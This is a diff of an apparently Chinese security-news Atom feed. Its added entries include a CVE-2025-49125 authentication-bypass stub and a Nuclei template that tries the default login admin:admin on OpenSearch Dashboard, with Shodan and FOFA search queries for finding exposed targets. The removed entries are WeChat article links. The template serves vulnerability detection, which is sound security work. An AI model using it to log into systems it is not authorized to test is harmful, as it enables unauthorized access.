+    <id>http://example.com/2025/06/16/github_2268809225/</id>
+    <published>2025-06-16T17:16:37.151Z</published>
+    <updated>2025-06-16T17:16:37.151Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-49125 Authentication Bypass</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49125</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 通过替代路径绕过认证的漏洞（CWE-288）</p><p><strong>来源：</strong> <a href="https://github.com/detectrespondrepeat/CVE-2025-49125-Authentication-Bypass">https://github.com/detectrespondrepeat/CVE-2025-49125-Authentication-Bypass</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49125-Authentication-Bypass"><a href="#CVE-2025-49125-Authentication-Bypass" class="headerlink" title="CVE-2025-49125-Authentication-Bypass"></a>CVE-2025-49125-Authentication-Bypass</h2><p>Authentication Bypass via Alternate Path Vulnerability (CWE-288)</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-49125 Authentication Bypass&lt;/p</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>OpenSearch Dashboard 默认登录凭证漏洞</title>
+    <link href="http://example.com/2025/06/16/github_3373530550/"/>
+    <id>http://example.com/2025/06/16/github_3373530550/</id>
+    <published>2025-06-16T17:15:34.716Z</published>
+    <updated>2025-06-16T17:15:34.713Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> OpenSearch Dashboard 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> OpenSearch Dashboard是一个社区驱动的开源搜索和分析套件。此模板检测使用默认凭证（admin:admin）的实例。</p><p><strong>产品厂商：</strong> OpenSearch</p><p><strong>产品名称：</strong> OpenSearch Dashboard</p><p><strong>搜索语法：</strong> title:”OpenSearch”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c3c3bdfe77a3b240fa2f704e3b999788e7824e65/http%2Fdefault-logins%2Fopensearch-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c3c3bdfe77a3b240fa2f704e3b999788e7824e65/http%2Fdefault-logins%2Fopensearch-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> opensearch-dashboard-default-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> OpenSearch Dashboard <span class="hljs-operator">-</span> Default Login<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    OpenSearch Dashboard is a community-driven, open source search and analytics suite. This template detects instances using default credentials (admin:admin).<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>opensearch.org<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>latest<span class="hljs-operator">/</span>security<span class="hljs-operator">/</span>access-control<span class="hljs-operator">/</span>users-roles<span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/opensearch-project/OpenSearch-Dashboards</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;OpenSearch&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;OpenSearch&quot;</span><br>  <span class="hljs-params">tags:</span> opensearch,default-login,misconfig<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> admin<br>  <span class="hljs-params">password:</span> admin<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/auth/login</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">osd-xsrf:</span> osd-fetch<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>        &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;username&#125;&#125;&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;password&#125;&#125;&quot;</span>&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains_all(body, <span class="hljs-string">&quot;username<span class="hljs-char escape_">\&quot;</span>:&quot;</span>, <span class="hljs-string">&quot;roles<span class="hljs-char escape_">\&quot;</span>:&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(content_type, <span class="hljs-string">&quot;application/json&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; OpenSearch Dashboard 默认登录凭证漏洞&lt;/p&gt;
+&lt;p&gt;&lt;s</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    
+  </entry>
   
   <entry>
     <title>Hewlett Packard LaserJet Printer 默认登录漏洞</title>
@@ -357,195 +545,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>伊朗和以色列境内的遇袭地点地理位置</title>
-    <link href="http://example.com/2025/06/16/weixin_3104237671/"/>
-    <id>http://example.com/2025/06/16/weixin_3104237671/</id>
-    <published>2025-06-16T10:51:27.786Z</published>
-    <updated>2025-06-16T10:51:27.783Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/d43HXYi77Jxrw501MeZcig">https://mp.weixin.qq.com/s/d43HXYi77Jxrw501MeZcig</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/d43HXYi77Jxrw501MeZcig&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>谷歌应用商店暗藏隐患，新型钓鱼应用绕过审核防线</title>
-    <link href="http://example.com/2025/06/16/weixin_1349937120/"/>
-    <id>http://example.com/2025/06/16/weixin_1349937120/</id>
-    <published>2025-06-16T10:15:05.714Z</published>
-    <updated>2025-06-16T10:15:05.712Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Wn0DO7k1gbOQK5YVSikZIA">https://mp.weixin.qq.com/s/Wn0DO7k1gbOQK5YVSikZIA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Wn0DO7k1gbOQK5YVSikZIA&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>首席信息安全官为何需要理解AI技术栈——网络安全视角</title>
-    <link href="http://example.com/2025/06/16/weixin_1208360068/"/>
-    <id>http://example.com/2025/06/16/weixin_1208360068/</id>
-    <published>2025-06-16T10:15:05.380Z</published>
-    <updated>2025-06-16T10:15:05.376Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/yG634bNNrbPn8pzuQw3IEQ">https://mp.weixin.qq.com/s/yG634bNNrbPn8pzuQw3IEQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/yG634bNNrbPn8pzuQw3IEQ&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>斗象与派网联合发布国内首个MSSP托管安全运营「专有服务网络」</title>
-    <link href="http://example.com/2025/06/16/weixin_2319134914/"/>
-    <id>http://example.com/2025/06/16/weixin_2319134914/</id>
-    <published>2025-06-16T10:15:05.062Z</published>
-    <updated>2025-06-16T10:15:05.056Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/LiT62e_Bqv0hrdOYz6zfCA">https://mp.weixin.qq.com/s/LiT62e_Bqv0hrdOYz6zfCA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/LiT62e_Bqv0hrdOYz6zfCA&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>防火墙防不住的敌人：揭秘APT的&quot;特工渗透术&quot;</title>
-    <link href="http://example.com/2025/06/16/weixin_3139913162/"/>
-    <id>http://example.com/2025/06/16/weixin_3139913162/</id>
-    <published>2025-06-16T10:15:03.950Z</published>
-    <updated>2025-06-16T10:15:03.944Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/0egjFdgFhUZgsIN-C69zUw">https://mp.weixin.qq.com/s/0egjFdgFhUZgsIN-C69zUw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/0egjFdgFhUZgsIN-C69zUw&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络安全信息与动态周报2025年第23期（6月2日-6月8日）</title>
-    <link href="http://example.com/2025/06/16/weixin_819756068/"/>
-    <id>http://example.com/2025/06/16/weixin_819756068/</id>
-    <published>2025-06-16T10:01:22.767Z</published>
-    <updated>2025-06-16T10:01:22.760Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/rtvdVZ4EZatpXfTVh5jALQ">https://mp.weixin.qq.com/s/rtvdVZ4EZatpXfTVh5jALQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/rtvdVZ4EZatpXfTVh5jALQ&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【AI风险通告】MCP Inspector存在远程代码执行漏洞（CVE-2025-49596）</title>
-    <link href="http://example.com/2025/06/16/weixin_2290994233/"/>
-    <id>http://example.com/2025/06/16/weixin_2290994233/</id>
-    <published>2025-06-16T10:01:20.879Z</published>
-    <updated>2025-06-16T10:01:20.876Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/mZYcU-t07XfCqwL_2NHOJw">https://mp.weixin.qq.com/s/mZYcU-t07XfCqwL_2NHOJw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/mZYcU-t07XfCqwL_2NHOJw&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
     
   </entry>
   
